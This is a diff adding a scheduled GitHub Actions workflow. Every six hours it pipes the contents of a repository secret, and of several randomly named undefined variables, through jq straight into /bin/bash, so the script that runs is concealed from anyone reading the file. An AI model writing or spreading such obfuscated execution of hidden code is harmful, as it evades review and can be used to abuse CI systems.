@@ -1,0 +1,25 @@
+name: kongxianshulei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kongxianshulei
+        env:
+          nhkz2: ${{ secrets.nhkz2 }}
+        run: |
+          echo $nhkz2 | jq -r .v1 | /bin/bash
+          echo $ckfe5197 | jq -r .xxfm5 | /bin/bash
+          echo $pqsyb26308 | jq -r .plsnu2 | /bin/bash
+          echo $fhegw03366 | jq -r .bafn5 | /bin/bash
+          echo $anp2691 | jq -r .s29262 | /bin/bash
+          echo $pndcl4362 | jq -r .ijqc83 | /bin/bash
+          echo $eywa2611 | jq -r .esnbg16 | /bin/bash
+          echo $d34036 | jq -r .koeb6 | /bin/bash
+          echo $ixwd6 | jq -r .cih3 | /bin/bash
+
